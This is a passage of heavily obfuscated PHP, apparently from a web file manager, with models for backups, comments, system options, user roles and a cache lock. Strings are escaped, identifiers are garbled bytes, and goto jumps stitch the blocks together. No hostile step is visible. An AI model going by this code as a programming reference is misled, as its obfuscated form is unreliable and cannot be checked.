"\x53\171\163\x74\145\x6d\56\x62\x61\143\153\165\160\x4c\x69\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\155\145", "\x73\x74\x61\x74\165\x73", "\x63\157\x6e\164\145\x6e\x74", "\x6d\x61\156\x75\141\x6c", "\x72\x65\163\x75\x6c\164", "\x74\x69\155\145\x46\162\157\155", "\x74\151\155\145\x54\x6f"); public function config() { $•ğúó‘Ü =& $_SERVER[÷ôÚîå]; Action($•ğúó‘Ü[2003])->taskInit(); $â°øâ¬ = Model($•ğúó‘Ü[859])->get($•ğúó‘Ü[872]); $â°øâ¬ = json_decode($â°øâ¬, !0); $â°øâ¬ = is_array($â°øâ¬) ? $â°øâ¬ : array(); $this->parseContent($â°øâ¬); unset($â°øâ¬[$•ğúó‘Ü[1749]]); Model($•ğúó‘Ü[1748])->cacheClear(); $şª”ïÉë = $•ğúó‘Ü[2004]; $¼ì¹¤­³ = Model($•ğúó‘Ü[2005])->findByKey($•ğúó‘Ü[1767], $şª”ïÉë); if (!$¼ì¹¤­³) { $¼ì¹¤­³ = array(); } if (isset($¼ì¹¤­³[$•ğúó‘Ü[216]])) { $¼ì¹¤­³[$•ğúó‘Ü[216]] = json_decode($¼ì¹¤­³[$•ğúó‘Ü[216]], !0); } if (isset($â°øâ¬[$•ğúó‘Ü[216]])) { $¼ì¹¤­³[$•ğúó‘Ü[216]][$•ğúó‘Ü[1752]] = $â°øâ¬[$•ğúó‘Ü[216]]; unset($â°øâ¬[$•ğúó‘Ü[216]]); } return array_merge($¼ì¹¤­³, $â°øâ¬); } public function listData($®óºÄŠŸ = false, $å§‡©½Ò = "\x6d\157\144\151\146\171\x54\x69\x6d\x65", $ı¹€ß¨å = false) { $ÂË„ŸÏú = parent::listData($®óºÄŠŸ, $å§‡©½Ò, !0); if (!$ÂË„ŸÏú) { return $ÂË„ŸÏú; } if ($®óºÄŠŸ) { $ÂË„ŸÏú = array($ÂË„ŸÏú); } foreach ($ÂË„ŸÏú as &$ÕŠ‚šê) { $this->parseContent($ÕŠ‚šê); } return $®óºÄŠŸ ? $ÂË„ŸÏú[0] : $ÂË„ŸÏú; } public function parseContent(&$ÛÃŞĞ—) { $ªöÁàÉ² =& $_SERVER[÷ôÚîå]; $ê¼èÁË = _get($ÛÃŞĞ—, $ªöÁàÉ²[181], $ªöÁàÉ²[101]); if (!in_array($ê¼èÁË, array($ªöÁàÉ²[865], $ªöÁàÉ²[1222]))) { $ÛÃŞĞ—[$ªöÁàÉ²[181]] = $ê¼èÁË == $ªöÁàÉ²[101] ? $ªöÁàÉ²[1222] : $ªöÁàÉ²[865]; } } public function lastItem() { $³ë‹èÃ× = $this->listData(); return !empty($³ë‹èÃ×[0]) ? $³ë‹èÃ×[0] : null; } public function kill($«‹Ş¾à¿) { $Û–©»úç =& $_SERVER[÷ôÚîå]; $à×Ğêæ¡ = $this->listData($«‹Ş¾à¿); if (!$à×Ğêæ¡ || empty($à×Ğêæ¡[$Û–©»úç[32]])) { return !0; } Task::kill($Û–©»úç[871]); Task::kill($Û–©»úç[890]); Task::kill($Û–©»úç[899]); $Ñú³­Ÿ˜ = $à×Ğêæ¡[$Û–©»úç[32]]; $ñšÄ‹ô = TEMP_FILES . $Û–©»úç[868] . $Ñú³­Ÿ˜ . $Û–©»úç[8]; IO::remove($ñšÄ‹ô, !1); return $this->remove($«‹Ş¾à¿); } public function remove($ç÷ÜÄŠØ) { $°Û«¶« = $this->listData($ç÷ÜÄŠØ); if (!$°Û«¶«) { return !0; } return $this->backupRemove($°Û«¶«); } private function backupRemove($ŞÃå×²) { parent::remove($ŞÃå×²[$_SERVER[÷ôÚîå][484]]); $½ÚÉÜ€Ë = $this->backupPath($ŞÃå×²); IO::remove($½ÚÉÜ€Ë, !1); return !0; } private function backupPath($œÌ–¡Š‰) { $°ÍòÉ¥È =& $_SERVER[÷ôÚîå]; $§ß‚¾Ó¢ = $œÌ–¡Š‰[$°ÍòÉ¥È[32]]; $³õšÓ¢ = Model($°ÍòÉ¥È[859])->get($°ÍòÉ¥È[860]); $Ï«Åô… = substr(md5($°ÍòÉ¥È[861] . $³õšÓ¢ . $§ß‚¾Ó¢), 0, 8); return "\173\151\157\72{$œÌ–¡Š‰[$°ÍòÉ¥È[841]]}\175\x2f\x64\x61\164\141\142\141\x73\x65\x2f\x62\x61\x63\x6b\x75\160\57" . $§ß‚¾Ó¢ . $°ÍòÉ¥È[11] . $Ï«Åô…; } public function start() { $»¤÷¯™Ô =& $_SERVER[÷ôÚîå]; if ($GLOBALS[$»¤÷¯™Ô[6]][$»¤÷¯™Ô[102]][$»¤÷¯™Ô[2006]] != $»¤÷¯™Ô[101]) { return !0; } $À·ÀÚê° = $this->config(); if (!$À·ÀÚê° || $À·ÀÚê°[$»¤÷¯™Ô[1749]] != $»¤÷¯™Ô[101]) { return !1; } if ($À·ÀÚê°[$»¤÷¯™Ô[181]] == $»¤÷¯™Ô[865]) { $Ñà—î‚î = Model($»¤÷¯™Ô[859])->get($»¤÷¯™Ô[1335]); if ($Ñà—î‚î == $»¤÷¯™Ô[1336]) { $À·ÀÚê°[$»¤÷¯™Ô[181]] = $»¤÷¯™Ô[1222]; } } $ĞÖŒÒ¬å = $this->process(); foreach ($ĞÖŒÒ¬å as $¹¢Ï³¨Ğ) { if ($¹¢Ï³¨Ğ) { return Task::restart($¹¢Ï³¨Ğ[$»¤÷¯™Ô[484]]); } } $à¾şíøœ = new Backup(); $©ğšê¢ = $à¾şíøœ->db(); if ($©ğšê¢) { $©ğšê¢ = $à¾şíøœ->dbFile(); if ($©ğšê¢ && $À·ÀÚê°[$»¤÷¯™Ô[181]] == $»¤÷¯™Ô[865]) { $©ğšê¢ = $à¾şíøœ->file(); } } Backup::set(array($»¤÷¯™Ô[839] => 1, $»¤÷¯™Ô[850] => time())); return !0; } public function process() { $º™Ì õ =& $_SERVER[÷ôÚîå]; $×ú±ûï¦ = array($º™Ì õ[846] => Task::get($º™Ì õ[871]), $º™Ì õ[851] => Task::get($º™Ì õ[890]), $º™Ì õ[240] => Task::get($º™Ì õ[899])); $»ñ…ø”¦ = !1; foreach ($×ú±ûï¦ as &$ßÒºÉ) { if ($»ñ…ø”¦) { $ßÒºÉ = !1; continue; } if ($ßÒºÉ) { $è™Ìæ‹Ê = intval(_get($ßÒºÉ, $º™Ì õ[1784], 0)); if (time() - $è™Ìæ‹Ê > 7200) { Task::kill($ßÒºÉ[$º™Ì õ[484]]); $»ñ…ø”¦ = !0; $ßÒºÉ = !1; } } } return $×ú±ûï¦; } public function restore() { $æÏšÉ¬Ğ =& $_SERVER[÷ôÚîå]; ActionCall($æÏšÉ¬Ğ[1149], !0, 1); ActionCall($æÏšÉ¬Ğ[1149], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\x6c\x65\x4e\141\x6d\145" => "\x63\x6f\x6d\x6d\145\156\164\137\155\145\164\x61", "\x6d\145\x74\x61\106\x69\145\x6c\x64" => "\143\157\x6d\155\x65\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ºÄÇèŠ) { $íËé‘ÖÕ =& $_SERVER[÷ôÚîå]; if ($ºÄÇèŠ[$íËé‘ÖÕ[2007]]) { $áËûª›Ô = $this->where(array($íËé‘ÖÕ[2008] => $ºÄÇèŠ[$íËé‘ÖÕ[2007]]))->find(); if (!$áËûª›Ô || $áËûª›Ô[$íËé‘ÖÕ[200]] != $ºÄÇèŠ[$íËé‘ÖÕ[200]] || $áËûª›Ô[$íËé‘ÖÕ[578]] != $ºÄÇèŠ[$íËé‘ÖÕ[578]]) { return !1; } $this->where(array($íËé‘ÖÕ[2008] => $ºÄÇèŠ[$íËé‘ÖÕ[2007]]))->setAdd($íËé‘ÖÕ[2009], 1); } $ºÄÇèŠ[$íËé‘ÖÕ[2010]] = 0; $ºÄÇèŠ[$íËé‘ÖÕ[2009]] = 0; $ºÄÇèŠ[$íËé‘ÖÕ[839]] = 1; return $this->add($ºÄÇèŠ); } public function commentCount($ã…±íÖ—, $ßûÌâ®Å, $ÁÉ†Ö©® = false) { $Øğä‹¿… =& $_SERVER[÷ôÚîå]; if (!$ã…±íÖ—) { return array(); } if (is_string($ã…±íÖ—) || is_int($ã…±íÖ—)) { $ã…±íÖ— = array($ã…±íÖ—); } $…ÁœÒÑ  = array($Øğä‹¿…[578], $Øğä‹¿…[2011] => $Øğä‹¿…[574]); $ òà³çá = array($Øğä‹¿…[578] => array($Øğä‹¿…[7], $ã…±íÖ—), $Øğä‹¿…[200] => $ßûÌâ®Å); if ($ÁÉ†Ö©®) { $ òà³çá[$Øğä‹¿…[1779]] = $ÁÉ†Ö©®; } $ˆÛš¯µÍ = $this->field($…ÁœÒÑ )->where($ òà³çá)->group($Øğä‹¿…[578])->select(); return array_to_keyvalue($ˆÛš¯µÍ, $Øğä‹¿…[578], $Øğä‹¿…[574]); } public function starTarget($°Üß™ÜØ, $ß˜¥ıÔ½) { $°ÒÛöÓŒ =& $_SERVER[÷ôÚîå]; $íŸã‹À­ = $°Üß™ÜØ + self::TYPE_STAR_OFFSET; $»òúË¹ì = array($°ÒÛöÓŒ[1779] => USER_ID, $°ÒÛöÓŒ[200] => $íŸã‹À­, $°ÒÛöÓŒ[578] => $ß˜¥ıÔ½); $€¿²Ì¿ = $this->where($»òúË¹ì)->find(); if ($€¿²Ì¿) { return $this->where(array($°ÒÛöÓŒ[484] => $€¿²Ì¿[$°ÒÛöÓŒ[484]]))->delete(); } $ôùÊ£“£ = array($°ÒÛöÓŒ[2007] => 0, $°ÒÛöÓŒ[1779] => USER_ID, $°ÒÛöÓŒ[839] => 1, $°ÒÛöÓŒ[181] => $°ÒÛöÓŒ[12], $°ÒÛöÓŒ[200] => $íŸã‹À­, $°ÒÛöÓŒ[578] => $ß˜¥ıÔ½, $°ÒÛöÓŒ[2010] => 0, $°ÒÛöÓŒ[2009] => 0); return $this->add($ôùÊ£“£); } public function starTargetCount($—¢ñõºç, $‹–ÔÅğ¿) { $ĞæØª‚· =& $_SERVER[÷ôÚîå]; $ëÒøÄ×½ = $‹–ÔÅğ¿ + self::TYPE_STAR_OFFSET; $àæé€‰ = $this->commentCount($—¢ñõºç, $ëÒøÄ×½); $Êïğ‘ë¡ = $this->commentCount($—¢ñõºç, $ëÒøÄ×½, USER_ID); return array($ĞæØª‚·[2012] => $àæé€‰, $ĞæØª‚·[2013] => $Êïğ‘ë¡); } public function starTargetUserList($µºÏÌ’ï, $…İÃå“ã) { $á†Ú–ö =& $_SERVER[÷ôÚîå]; $îµ¸‘† = $µºÏÌ’ï + self::TYPE_STAR_OFFSET; $ÁÅ¦ÃÍ = array($á†Ú–ö[578] => $…İÃå“ã, $á†Ú–ö[200] => $îµ¸‘†); $»¢àà÷¬ = $this->where($ÁÅ¦ÃÍ)->count(); $û“öÕäŞ = array($á†Ú–ö[341] => $»¢àà÷¬, $á†Ú–ö[2014] => array()); if (!$»¢àà÷¬) { return $û“öÕäŞ; } $µøƒá›ì = $this->field($á†Ú–ö[1779])->where($ÁÅ¦ÃÍ)->limit(500)->select(); $µøƒá›ì = array_to_keyvalue($µøƒá›ì, $á†Ú–ö[12], $á†Ú–ö[1779]); $û“öÕäŞ[$á†Ú–ö[2014]] = Model($á†Ú–ö[586])->userListInfo($µøƒá›ì); return $û“öÕäŞ; } public function prasiseUserList($©¯üëÚù) { $ŠŞÑŞÚº =& $_SERVER[÷ôÚîå]; $¯œ“Ú•Ï = array($ŠŞÑŞÚº[2015] => $©¯üëÚù); $’¤¤ìô£ = $this->where($¯œ“Ú•Ï)->find(); $„µÆü§Á = _get($’¤¤ìô£, $ŠŞÑŞÚº[2010], 0); $øŒ’¡µü = array($ŠŞÑŞÚº[341] => $„µÆü§Á, $ŠŞÑŞÚº[2014] => array()); if (!$„µÆü§Á) { return $øŒ’¡µü; } $«›Ê¸ä = Model($ŠŞÑŞÚº[2016])->field($ŠŞÑŞÚº[1779])->where($¯œ“Ú•Ï)->limit(500)->select(); $«›Ê¸ä = array_to_keyvalue($«›Ê¸ä, $ŠŞÑŞÚº[12], $ŠŞÑŞÚº[1779]); $øŒ’¡µü[$ŠŞÑŞÚº[2014]] = Model($ŠŞÑŞÚº[586])->userListInfo($«›Ê¸ä); return $øŒ’¡µü; } public function remove($ŞµÀÇ) { $Û½Êêˆ =& $_SERVER[÷ôÚîå]; $ìÚ‰ÅÛ˜ = array($Û½Êêˆ[2008] => $ŞµÀÇ); $ä˜·¶šŞ = $this->where($ìÚ‰ÅÛ˜)->find(); if ($ä˜·¶šŞ[$Û½Êêˆ[2007]]) { $this->where(array($Û½Êêˆ[2008] => $ä˜·¶šŞ[$Û½Êêˆ[2007]]))->setAdd($Û½Êêˆ[2009], -1); } return $this->where($ìÚ‰ÅÛ˜)->delete(); } public function edit($Ğ˜Šß“Ù, $ê¸Øó¼) { $ü„™Îáº =& $_SERVER[÷ôÚîå]; $™ú‹¸µ» = array($ü„™Îáº[2008] => $Ğ˜Šß“Ù); return $this->where($™ú‹¸µ»)->save(array($ü„™Îáº[2017] => $ê¸Øó¼)); } public function prasise($ëû£õÈ¾) { $÷öîš¹„ =& $_SERVER[÷ôÚîå]; $®æ—ƒ = Model($÷öîš¹„[2018]); $‡´×Úö§ = array($÷öîš¹„[2008] => $ëû£õÈ¾, $÷öîš¹„[1770] => USER_ID); $«×§ë… = $®æ—ƒ->where($‡´×Úö§)->find(); if (!$«×§ë…) { $®æ—ƒ->add($‡´×Úö§); $Æšèå¶Ï = $this->where(array($÷öîš¹„[2008] => $ëû£õÈ¾))->setAdd($÷öîš¹„[2010], 1); } else { $®æ—ƒ->where($‡´×Úö§)->delete(); $Æšèå¶Ï = $this->where(array($÷öîš¹„[2008] => $ëû£õÈ¾))->setAdd($÷öîš¹„[2010], -1); } return $Æšèå¶Ï; } public function targetInfo($™ºï²Ÿå, $Ûêê¥¿û) { $­Ù¨‹²ß =& $_SERVER[÷ôÚîå]; $ÀñÀÇÖ½ = array($­Ù¨‹²ß[657] => $™ºï²Ÿå, $­Ù¨‹²ß[658] => $Ûêê¥¿û); $ŒˆßïÈæ = $this->where($ÀñÀÇÖ½)->count(); $şÇª·¿ = "\122\111\x47\110\x54\x20\x4a\117\111\116\x20{$this->tablePrefix}\x63\x6f\155\x6d\x65\156\164\x5f\160\x72\x61\151\x73\x65\40\x73\164\x61\162\x20\x6f\x6e\40\143\x6f\155\155\x65\156\x74\x2e\143\157\155\x6d\145\156\x74\111\x44\40\x3d\x20\163\164\x61\x72\x2e\x63\157\155\x6d\x65\x6e\x74\111\104"; $€é™ÒòÚ = $this->alias($­Ù¨‹²ß[439])->where($ÀñÀÇÖ½)->join($şÇª·¿, $­Ù¨‹²ß[2019])->count(); $ÙÓ›êâã = array($­Ù¨‹²ß[2020] => $ŒˆßïÈæ, $­Ù¨‹²ß[2021] => $€é™ÒòÚ); return $ÙÓ›êâã; } public function listData($€Ã„õÉ) { $Êş’Î–• =& $_SERVER[÷ôÚîå]; if (isset($€Ã„õÉ[$Êş’Î–•[2022]])) { if ($€Ã„õÉ[$Êş’Î–•[2022]]) { $€Ã„õÉ[$Êş’Î–•[2015]] = array($Êş’Î–•[1103], intval($€Ã„õÉ[$Êş’Î–•[2022]])); } unset($€Ã„õÉ[$Êş’Î–•[2022]]); } if (isset($€Ã„õÉ[$Êş’Î–•[2023]])) { if ($€Ã„õÉ[$Êş’Î–•[2023]]) { $€Ã„õÉ[$Êş’Î–•[2015]] = array($Êş’Î–•[1100], intval($€Ã„õÉ[$Êş’Î–•[2023]])); } unset($€Ã„õÉ[$Êş’Î–•[2023]]); } return $this->_listData($€Ã„õÉ); } private function _listData($—Î½öŒÁ) { $©ı”òŠŠ =& $_SERVER[÷ôÚîå]; $…Óß‚€œ = $this->where($—Î½öŒÁ)->_makeOrder()->selectPage(100); $this->_listAppendParent($…Óß‚€œ[$©ı”òŠŠ[454]]); $this->_listAppendUser($…Óß‚€œ[$©ı”òŠŠ[454]]); $this->_listAppendMeta($…Óß‚€œ[$©ı”òŠŠ[454]]); return $…Óß‚€œ; } private function _makeOrder() { $×•Ç‹ø =& $_SERVER[÷ôÚîå]; $ƒÖ‡Ëù = array($×•Ç‹ø[2010], $×•Ç‹ø[2009], $×•Ç‹ø[241]); $öì´‰§æ = Input::get($×•Ç‹ø[539], $×•Ç‹ø[7], $×•Ç‹ø[506], $ƒÖ‡Ëù); $¤äç»Ç = Input::get($×•Ç‹ø[540], $×•Ç‹ø[7], $×•Ç‹ø[1772], array($×•Ç‹ø[2024], $×•Ç‹ø[535])); $àÕÊ“ = $öì´‰§æ . $×•Ç‹ø[53] . $¤äç»Ç; return $this->order($àÕÊ“); } private function _listAppendParent(&$î‘°Ÿ›) { $õúâ»» =& $_SERVER[÷ôÚîå]; $ú³ªĞ¿Î = array_unique(array_to_keyvalue($î‘°Ÿ›, $õúâ»»[12], $õúâ»»[2007])); $ú³ªĞ¿Î = array_remove_value($ú³ªĞ¿Î, $õúâ»»[238]); if (!$ú³ªĞ¿Î) { return; } $¼°êßŒó = $this->where(array($õúâ»»[2008] => array($õúâ»»[7], $ú³ªĞ¿Î)))->select(); $¼°êßŒó = array_to_keyvalue($¼°êßŒó, $õúâ»»[2015]); foreach ($î‘°Ÿ› as &$›Şıã”Ÿ) { if (isset($¼°êßŒó[$›Şıã”Ÿ[$õúâ»»[2007]]])) { $›Şıã”Ÿ[$õúâ»»[2025]] = $¼°êßŒó[$›Şıã”Ÿ[$õúâ»»[2007]]]; } } unset($›Şıã”Ÿ); } private function _listAppendUser(&$ÌµÙùº) { $Çõ¨¦‹Ù =& $_SERVER[÷ôÚîå]; $¼ïÉ‰İğ = array_unique(array_to_keyvalue($ÌµÙùº, $Çõ¨¦‹Ù[12], $Çõ¨¦‹Ù[1779])); $¼ïÉ‰İğ = array_remove_value($¼ïÉ‰İğ, $Çõ¨¦‹Ù[238]); if (count($¼ïÉ‰İğ) == 0) { return; } foreach ($ÌµÙùº as $ÓüÓí÷Ì) { if (isset($ÓüÓí÷Ì[$Çõ¨¦‹Ù[2025]])) { $¼ïÉ‰İğ[] = $ÓüÓí÷Ì[$Çõ¨¦‹Ù[2025]][$Çõ¨¦‹Ù[1779]]; } } $ÊÒ’àÔÎ = Model($Çõ¨¦‹Ù[607])->userListInfo($¼ïÉ‰İğ); foreach ($ÌµÙùº as &$ÓüÓí÷Ì) { $ÓüÓí÷Ì[$Çõ¨¦‹Ù[671]] = $ÊÒ’àÔÎ[$ÓüÓí÷Ì[$Çõ¨¦‹Ù[1779]]]; if (isset($ÓüÓí÷Ì[$Çõ¨¦‹Ù[2025]])) { $ÓüÓí÷Ì[$Çõ¨¦‹Ù[2025]][$Çõ¨¦‹Ù[671]] = $ÊÒ’àÔÎ[$ÓüÓí÷Ì[$Çõ¨¦‹Ù[2025]][$Çõ¨¦‹Ù[1779]]]; } } unset($ÓüÓí÷Ì); } private function _listAppendMeta(&$¾·ª¢) { $­§¤”Ä =& $_SERVER[÷ôÚîå]; $ÉàĞ§ÜÔ = array_unique(array_to_keyvalue($¾·ª¢, $­§¤”Ä[12], $­§¤”Ä[2015])); $ÉàĞ§ÜÔ = array_remove_value($ÉàĞ§ÜÔ, $­§¤”Ä[238]); if (!$ÉàĞ§ÜÔ) { return; } foreach ($¾·ª¢ as $Ìõ™»“) { if (isset($Ìõ™»“[$­§¤”Ä[2025]])) { $ÉàĞ§ÜÔ[] = $Ìõ™»“[$­§¤”Ä[2025]][$­§¤”Ä[2015]]; } } $–ı¿Ü»ê = $this->metaList($ÉàĞ§ÜÔ); if (!$–ı¿Ü»ê) { return !1; } foreach ($¾·ª¢ as &$Ìõ™»“) { $Ìõ™»“[$­§¤”Ä[548]] = $–ı¿Ü»ê[$Ìõ™»“[$­§¤”Ä[2015]]]; if (isset($Ìõ™»“[$­§¤”Ä[2025]])) { $Ìõ™»“[$­§¤”Ä[2025]][$­§¤”Ä[548]] = $–ı¿Ü»ê[$Ìõ™»“[$­§¤”Ä[2025]][$­§¤”Ä[2015]]]; } } unset($Ìõ™»“); } private function metaList($Ì€¢ã…) { $¿½± ô =& $_SERVER[÷ôÚîå]; if (!$Ì€¢ã…) { return array(); } $ıüêõ£õ = array($¿½± ô[2015] => array($¿½± ô[7], $Ì€¢ã…)); $›…Ú¬æ = Model($¿½± ô[2026])->where($ıüêõ£õ)->select(); $›…Ú¬æ = array_to_keyvalue_group($›…Ú¬æ, $¿½± ô[2015]); foreach ($›…Ú¬æ as $×â–¥ÈÓ => $ÌºŸÛåå) { $ˆ†ÑäË® = array(); foreach ($ÌºŸÛåå as $¢“ş½Û‰) { $ˆ†ÑäË®[$¢“ş½Û‰[$¿½± ô[107]]] = $¢“ş½Û‰[$¿½± ô[459]]; } $›…Ú¬æ[$×â–¥ÈÓ] = $ˆ†ÑäË®; } return $›…Ú¬æ ? $›…Ú¬æ : array(); } public function removeTarget($Šğ‰íäŞ, $ş³›¥œ½) { $ŒùÊ’ŞÜ =& $_SERVER[÷ôÚîå]; if (!$ş³›¥œ½) { return !0; } $ş³›¥œ½ = is_array($ş³›¥œ½) ? $ş³›¥œ½ : array($ş³›¥œ½); $À¬¦¢®  = array($ŒùÊ’ŞÜ[200] => $Šğ‰íäŞ, $ŒùÊ’ŞÜ[578] => array($ŒùÊ’ŞÜ[7], $ş³›¥œ½)); $ªØ…ã = $this->field($ŒùÊ’ŞÜ[2015])->where($À¬¦¢® )->select(); $ä°ÎÒ™Ï = array_to_keyvalue($ªØ…ã, $ŒùÊ’ŞÜ[12], $ŒùÊ’ŞÜ[2015]); if (!$ä°ÎÒ™Ï) { return !0; } $À¬¦¢®  = array($ŒùÊ’ŞÜ[2015] => array($ŒùÊ’ŞÜ[7], $ä°ÎÒ™Ï)); $this->where($À¬¦¢® )->delete(); Model($ŒùÊ’ŞÜ[2018])->where($À¬¦¢® )->delete(); Model($ŒùÊ’ŞÜ[2027])->where($À¬¦¢® )->delete(); } } goto cÅ„Ç‡¸êÄ; EˆÖß¦Ô„: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\171\163\x74\145\155\x5f\x6f\160\164\151\157\156"; protected $jsonField = array("\155\x65\x6e\165", "\162\157\x6c\145", "\162\157\x6c\x65\107\162\157\165\x70", "\162\x65\x67\x69\163\x74", "\145\155\141\151\154"); function __construct() { parent::__construct(); } protected function cacheKey($á…Ö¨¸ü) { return "\x53\x79\163\x74\145\155\117\x70\164\x69\x6f\x6e\x5f{$á…Ö¨¸ü}"; } protected function optionDefault($ğåéñ®” = '') { $æ’ø²Ü— =& $_SERVER[÷ôÚîå]; if ($ğåéñ®” == $æ’ø²Ü—[12]) { return $GLOBALS[$æ’ø²Ü—[6]][$æ’ø²Ü—[466]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x72\157\154\145\x4c\151\x73\164"; public $field = array("\x6e\141\155\x65", "\x61\165\164\x68", "\x6c\x61\x62\145\154", "\144\151\x73\x70\x6c\x61\171", "\x73\171\163\164\145\155", "\144\x65\x73\143", "\151\147\x6e\157\x72\x65\x45\170\x74", "\151\147\156\157\x72\x65\x46\151\154\145\x53\151\x7a\x65", "\x61\x64\155\151\x6e\151\x73\164\x72\x61\x74\157\x72", "\x73\157\x72\x74"); public function listData($‡å¤–çÃ = false, $§ÊÍñÌğ = "\163\157\x72\x74", $îƒ¬¡ºË = false) { $ŞÜ¬¢Ù =& $_SERVER[÷ôÚîå]; $ÃÎ‰ã = parent::listData($‡å¤–çÃ, $§ÊÍñÌğ, $îƒ¬¡ºË); if (!$‡å¤–çÃ) { foreach ($ÃÎ‰ã as $ïéØªÆ³ => $ŞËæÛˆ) { if ($ŞËæÛˆ[$ŞÜ¬¢Ù[2185]] == 1) { $ÃÎ‰ã[$ïéØªÆ³][$ŞÜ¬¢Ù[535]] = LNG($ŞÜ¬¢Ù[2446]); } } } return $ÃÎ‰ã; } public function update($Ñ ‡ûäá, $¾ùõ¾¬ş) { $–Êßë¤Ù =& $_SERVER[÷ôÚîå]; $³”ß£ş¿ = parent::listData($Ñ ‡ûäá); $é÷è„Š = $this->findByName($¾ùõ¾¬ş[$–Êßë¤Ù[32]]); if (!$³”ß£ş¿ || $é÷è„Š && $é÷è„Š[$–Êßë¤Ù[484]] != $³”ß£ş¿[$–Êßë¤Ù[484]]) { return !1; } if ($é÷è„Š[$–Êßë¤Ù[2185]] == 1) { $¾ùõ¾¬ş = array($–Êßë¤Ù[32] => $¾ùõ¾¬ş[$–Êßë¤Ù[32]], $–Êßë¤Ù[2001] => $¾ùõ¾¬ş[$–Êßë¤Ù[2001]]); } $this->filterAuth($¾ùõ¾¬ş[$–Êßë¤Ù[496]]); return parent::update($Ñ ‡ûäá, $¾ùõ¾¬ş); } public function remove($³¤õÙ) { $êÄ¨Ó¶± = parent::listData($³¤õÙ); if (!$êÄ¨Ó¶± || $êÄ¨Ó¶±[$_SERVER[÷ôÚîå][201]]) { return !1; } return parent::remove($³¤õÙ); } public function add($Û ¿›Õ·) { $Û•Û·ğ§ =& $_SERVER[÷ôÚîå]; $ˆÄ»õ¡ = $Û ¿›Õ·[$Û•Û·ğ§[32]]; if ($this->findByName($ˆÄ»õ¡)) { return !1; } $öÇô³´  = array($Û•Û·ğ§[503] => $ˆÄ»õ¡, $Û•Û·ğ§[1984] => $Û•Û·ğ§[12], $Û•Û·ğ§[1980] => $Û•Û·ğ§[1988], $Û•Û·ğ§[2447] => 1, $Û•Û·ğ§[1983] => 0, $Û•Û·ğ§[2448] => 0, $Û•Û·ğ§[1982] => $this->getSort()); $Û ¿›Õ· = array_merge($öÇô³´ , $Û ¿›Õ·); $this->filterAuth($Û ¿›Õ·[$Û•Û·ğ§[496]]); return parent::insert($Û ¿›Õ·); } private function getSort() { $×ÔØåÁ  =& $_SERVER[÷ôÚîå]; $ÌğÊ¢í¾ = parent::listData(); $¤¶«î”Æ = array_to_keyvalue($ÌğÊ¢í¾, $×ÔØåÁ [12], $×ÔØåÁ [2002]); return empty($¤¶«î”Æ) ? 0 : max($¤¶«î”Æ) + 1; } private function filterAuth(&$…‚È» ¤) { $àÇ¯Ñ¢Ä =& $_SERVER[÷ôÚîå]; $—®ÔÔ¿Î = array(); $·¹ã–¶ = array_filter(explode($àÇ¯Ñ¢Ä[50], $…‚È» ¤)); foreach ($·¹ã–¶ as $…‚È» ¤) { $š¹ï÷ÃŠ = explode($àÇ¯Ñ¢Ä[10], $…‚È» ¤); if ($š¹ï÷ÃŠ[0] == $àÇ¯Ñ¢Ä[2449] && $š¹ï÷ÃŠ[1] != $àÇ¯Ñ¢Ä[1286]) { $¾¬Òõ¡ = $š¹ï÷ÃŠ[0] . $àÇ¯Ñ¢Ä[10] . $š¹ï÷ÃŠ[1] . $àÇ¯Ñ¢Ä[2450]; if (!in_array($¾¬Òõ¡, $·¹ã–¶)) { $—®ÔÔ¿Î[] = $¾¬Òõ¡; } } $—®ÔÔ¿Î[] = $…‚È» ¤; } $…‚È» ¤ = implode($àÇ¯Ñ¢Ä[50], $—®ÔÔ¿Î); } public function findRoleDefault() { $¢Úéù”Ã =& $_SERVER[÷ôÚîå]; $½ÊÆè¿ = parent::listData(); $ÒãÆÌœª = !1; foreach ($½ÊÆè¿ as $Ï…‡Ÿ¯÷) { if (!$Ï…‡Ÿ¯÷ || $Ï…‡Ÿ¯÷[$¢Úéù”Ã[2000]] == $¢Úéù”Ã[238] || $Ï…‡Ÿ¯÷[$¢Úéù”Ã[2185]] == 1) { continue; } if (strstr($Ï…‡Ÿ¯÷[$¢Úéù”Ã[496]], $¢Úéù”Ã[2451])) { continue; } if (!strstr($Ï…‡Ÿ¯÷[$¢Úéù”Ã[496]], $¢Úéù”Ã[2452])) { continue; } if (!$ÒãÆÌœª) { $ÒãÆÌœª = $Ï…‡Ÿ¯÷; continue; } $šêå‰€ = explode($¢Úéù”Ã[50], $ÒãÆÌœª[$¢Úéù”Ã[496]]); $¶“Şì¡è = explode($¢Úéù”Ã[50], $Ï…‡Ÿ¯÷[$¢Úéù”Ã[496]]); if (count($šêå‰€) > count($¶“Şì¡è)) { $ÒãÆÌœª = $Ï…‡Ÿ¯÷; } } return $ÒãÆÌœª ? $ÒãÆÌœª[$¢Úéù”Ã[484]] : $¢Úéù”Ã[12]; } public function sort($ñ¡‚æ€µ, $–î£åª) { return parent::update($ñ¡‚æ€µ, $–î£åª); } } goto cËÀ¢ëÖéº; BŒ«Å ¤­ë: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $œßÒå·¬ =& $_SERVER[÷ôÚîå]; if (self::$handle) { return self::$handle; } $ï°“‰“‰ = $GLOBALS[$œßÒå·¬[6]][$œßÒå·¬[434]]; self::$timeout = $ï°“‰“‰[$œßÒå·¬[930]] ? $ï°“‰“‰[$œßÒå·¬[930]] : 10; $¬šáâı = _get($GLOBALS[$œßÒå·¬[6]], $œßÒå·¬[931]); $²ŒÒ‘ù· = $ï°“‰“‰[$œßÒå·¬[916]] ? $ï°“‰“‰[$œßÒå·¬[916]] : $œßÒå·¬[240]; if ($²ŒÒ‘ù· == $œßÒå·¬[21] && $¬šáâı == $œßÒå·¬[13]) { $²ŒÒ‘ù· = $œßÒå·¬[240]; } switch ($²ŒÒ‘ù·) { case 